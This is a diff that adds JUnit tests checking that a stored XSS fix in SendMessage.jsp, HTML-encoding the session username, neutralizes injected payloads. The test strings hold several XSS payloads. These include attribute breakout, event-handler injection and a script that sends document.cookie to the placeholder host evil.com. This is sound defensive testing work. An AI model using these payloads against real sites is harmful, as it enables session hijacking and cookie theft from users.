@@ -669,4 +669,191 @@ public class StoredXssPreventionTest extends TestCase {
         assertTrue("HTML-encoded output must contain &lt; entities", rendered.contains("&lt;"));
         assertTrue("HTML-encoded output must contain &gt; entities", rendered.contains("&gt;"));
     }
+
+    // =========================================================================
+    // SendMessage.jsp Stored XSS remediation tests (CWE-79)
+    //
+    // Taint flow under test:
+    //   STORE:  An attacker registers or modifies their username to contain a
+    //           malicious payload (e.g., "><script>alert(1)</script>).
+    //   READ:   adminlogin.jsp reads the username from the DB via ResultSet rs
+    //           and stores it in the session: session.setAttribute("user", rs.getString("username"))
+    //   SINK:   SendMessage.jsp previously rendered it in an HTML attribute without encoding:
+    //             <input type="hidden" name="sender" value="<%=session.getAttribute("user")%>"/>
+    //   FIX:    SendMessage.jsp now wraps the value with Functions.escapeXml():
+    //             <input type="hidden" name="sender"
+    //               value="<%=Functions.escapeXml(String.valueOf(session.getAttribute("user")))%>"/>
+    // =========================================================================
+
+    /**
+     * Tests that a script-tag payload stored as a username is neutralized when
+     * rendered as an HTML input attribute value in SendMessage.jsp.
+     *
+     * Attack: attacker registers with username = <script>alert('XSS')</script>
+     *
+     * Before fix (VULNERABLE):
+     *   <input type="hidden" name="sender" value="<script>alert('XSS')</script>"/>
+     *   → Browser parses the injected <script> tag and executes JavaScript.
+     *
+     * After fix (SECURE):
+     *   <input type="hidden" name="sender"
+     *     value="&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;"/>
+     *   → Browser renders harmless text inside the attribute; no code executes.
+     */
+    public void testSendMessageSenderAttributeScriptTagPayloadIsNeutralized() {
+        // Simulate the username value stored in the DB and later placed in session
+        String sessionUserAttribute = "<script>alert('XSS')</script>";
+
+        // Simulate the remediated SendMessage.jsp rendering:
+        //   value="<%=Functions.escapeXml(String.valueOf(session.getAttribute("user")))%>"
+        String encodedValue = escapeXml(String.valueOf(sessionUserAttribute));
+        String rendered = "<input type=\"hidden\" name=\"sender\" value=\"" + encodedValue + "\"/>";
+
+        // The rendered attribute must not contain an unencoded opening script tag
+        assertFalse(
+            "Rendered sender attribute must not contain literal <script> tag",
+            rendered.contains("<script>")
+        );
+        // Angle brackets must be HTML-encoded
+        assertTrue("< in username must be encoded as &lt;", encodedValue.contains("&lt;"));
+        assertTrue("> in username must be encoded as &gt;", encodedValue.contains("&gt;"));
+        // Single quotes inside the payload must be encoded to prevent attribute breakout
+        assertTrue("' in username must be encoded as &#039;", encodedValue.contains("&#039;"));
+    }
+
+    /**
+     * Tests that an HTML attribute breakout payload stored as a username is
+     * neutralized when rendered in the SendMessage.jsp sender hidden field.
+     *
+     * Attack: attacker stores username = "><script>alert(document.cookie)</script>
+     *
+     * Without encoding, this would close the value attribute with `"`, then inject
+     * a new script element outside the input tag.  With escapeXml(), the `"` is
+     * encoded as &#034; and the `<`/`>` as &lt;/&gt;, preventing breakout.
+     */
+    public void testSendMessageSenderAttributeBreakoutPayloadIsNeutralized() {
+        String sessionUserAttribute = "\"><script>alert(document.cookie)</script>";
+
+        String encodedValue = escapeXml(String.valueOf(sessionUserAttribute));
+        String rendered = "<input type=\"hidden\" name=\"sender\" value=\"" + encodedValue + "\"/>";
+
+        assertFalse(
+            "Rendered sender field must not allow double-quote attribute breakout",
+            rendered.contains("\"><script>")
+        );
+        // Double-quote must be encoded to prevent attribute value escape
+        assertTrue("\" in username must be encoded as &#034;", encodedValue.contains("&#034;"));
+        assertTrue("< in username must be encoded as &lt;", encodedValue.contains("&lt;"));
+    }
+
+    /**
+     * Tests that an event-handler injection payload stored as a username is
+     * neutralized when rendered in the SendMessage.jsp sender hidden field.
+     *
+     * Attack: attacker stores username = " onmouseover="alert(1)" x="
+     *
+     * Without encoding the double-quote, the extra attribute `onmouseover` would
+     * be injected into the input element, executing JavaScript on mouse interaction.
+     */
+    public void testSendMessageSenderAttributeEventHandlerInjectionIsNeutralized() {
+        String sessionUserAttribute = "\" onmouseover=\"alert(1)\" x=\"";
+
+        String encodedValue = escapeXml(String.valueOf(sessionUserAttribute));
+        String rendered = "<input type=\"hidden\" name=\"sender\" value=\"" + encodedValue + "\"/>";
+
+        assertFalse(
+            "Rendered sender field must not allow event-handler attribute injection",
+            rendered.contains("onmouseover=")
+        );
+        assertTrue("\" in username must be encoded as &#034;", encodedValue.contains("&#034;"));
+    }
+
+    /**
+     * Tests that a normal (benign) username passes through the encoding in
+     * SendMessage.jsp without corruption — backward compatibility is preserved.
+     *
+     * A regular alphanumeric username must appear verbatim in the attribute value,
+     * since none of its characters require HTML encoding.
+     */
+    public void testSendMessageSenderAttributeNormalUsernameIsPreserved() {
+        String sessionUserAttribute = "john_doe123";
+
+        String encodedValue = escapeXml(String.valueOf(sessionUserAttribute));
+        String rendered = "<input type=\"hidden\" name=\"sender\" value=\"" + encodedValue + "\"/>";
+
+        assertEquals(
+            "Normal username must pass through escapeXml unchanged",
+            sessionUserAttribute,
+            encodedValue
+        );
+        assertTrue(
+            "Rendered sender field must contain the normal username verbatim",
+            rendered.contains("value=\"" + sessionUserAttribute + "\"")
+        );
+    }
+
+    /**
+     * Tests that a null session attribute is handled gracefully by
+     * String.valueOf() + escapeXml() in SendMessage.jsp without throwing
+     * a NullPointerException.
+     *
+     * session.getAttribute("user") may return null when the session is in an
+     * unexpected state; String.valueOf(null) converts it to "null" and
+     * escapeXml("null") passes through unchanged — neither throws nor crashes.
+     */
+    public void testSendMessageSenderAttributeNullSessionAttributeHandledGracefully() {
+        // Simulate session.getAttribute("user") returning null
+        Object sessionAttr = null;
+
+        // The fix applies String.valueOf() before escapeXml() — must not throw NPE
+        String encodedValue = escapeXml(String.valueOf(sessionAttr));
+
+        assertNotNull("Encoding null session attribute must return non-null", encodedValue);
+        // String.valueOf(null) → "null"; escapeXml("null") → "null"
+        assertEquals("Null session attribute must encode to string 'null'", "null", encodedValue);
+
+        // Must produce a syntactically valid input element (no unencoded special chars)
+        String rendered = "<input type=\"hidden\" name=\"sender\" value=\"" + encodedValue + "\"/>";
+        assertFalse("Rendered field must not contain raw < from null handling", rendered.contains("<script>"));
+    }
+
+    /**
+     * Tests the complete taint flow simulation for the Stored XSS in SendMessage.jsp:
+     *   1. Attacker stores a malicious username in the database (via registration).
+     *   2. adminlogin.jsp reads it from DB and stores in session.
+     *   3. SendMessage.jsp renders the session value in an HTML attribute.
+     *
+     * After the fix, step 3 uses Functions.escapeXml(), breaking the taint flow.
+     *
+     * Before fix (VULNERABLE):
+     *   value="<%=session.getAttribute("user")%>"
+     *
+     * After fix (SECURE):
+     *   value="<%=Functions.escapeXml(String.valueOf(session.getAttribute("user")))%>"
+     */
+    public void testSendMessageFullStoredXssTaintFlowIsBlocked() {
+        // Step 1: Malicious username stored in DB by attacker during registration
+        String storedUsername = "<script>new Image().src='https://evil.com?s='+document.cookie</script>";
+
+        // Step 2: adminlogin.jsp reads from DB rs.getString("username") → session attribute
+        Object sessionUser = storedUsername;  // simulates session.setAttribute("user", rs.getString("username"))
+
+        // Step 3 (FIXED): SendMessage.jsp encodes before rendering in HTML attribute
+        String encodedValue = escapeXml(String.valueOf(sessionUser));
+        String htmlOutput = "<input type=\"hidden\" name=\"sender\" value=\"" + encodedValue + "\"/>";
+
+        // The full rendered HTML must not execute any script
+        assertFalse(
+            "Full stored XSS taint flow must be broken: no <script> tag in rendered output",
+            htmlOutput.contains("<script>")
+        );
+        assertFalse(
+            "Full stored XSS taint flow must be broken: no </script> tag in rendered output",
+            htmlOutput.contains("</script>")
+        );
+        assertTrue(
+            "Stored XSS payload must be HTML-encoded in rendered output",
+            htmlOutput.contains("&lt;script&gt;")
+        );
+    }
 }
